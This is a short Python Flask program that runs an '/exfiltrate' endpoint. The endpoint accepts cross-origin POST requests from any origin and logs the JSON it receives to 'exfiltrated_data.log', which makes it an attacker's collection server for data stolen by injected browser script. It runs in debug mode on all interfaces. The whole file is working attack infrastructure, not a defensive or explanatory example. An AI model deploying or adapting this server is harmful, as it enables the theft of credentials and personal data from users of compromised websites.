from flask import Flask, request, make_response
import json
from datetime import datetime

app = Flask(__name__)


# Function to add CORS headers to responses
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'  # Allows requests from any origin
    response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'  # Allowed methods
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'  # Allowed headers
    return response


@app.route('/exfiltrate', methods=['POST', 'OPTIONS'])
def exfiltrate():
    if request.method == 'OPTIONS':
        # Handle the CORS preflight request
        response = make_response()
        return add_cors_headers(response)
    elif request.method == 'POST':
        # Handle the actual POST request
        data = request.json
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Received exfiltrated data: {json.dumps(data)}\n"
        print(log_entry, end='')  # Log to console
        try:
            with open('exfiltrated_data.log', 'a') as log_file:
                log_file.write(log_entry)
        except Exception as e:
            print(f"Failed to write to log file: {e}")
        response = make_response('Data received', 200)
        return add_cors_headers(response)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)

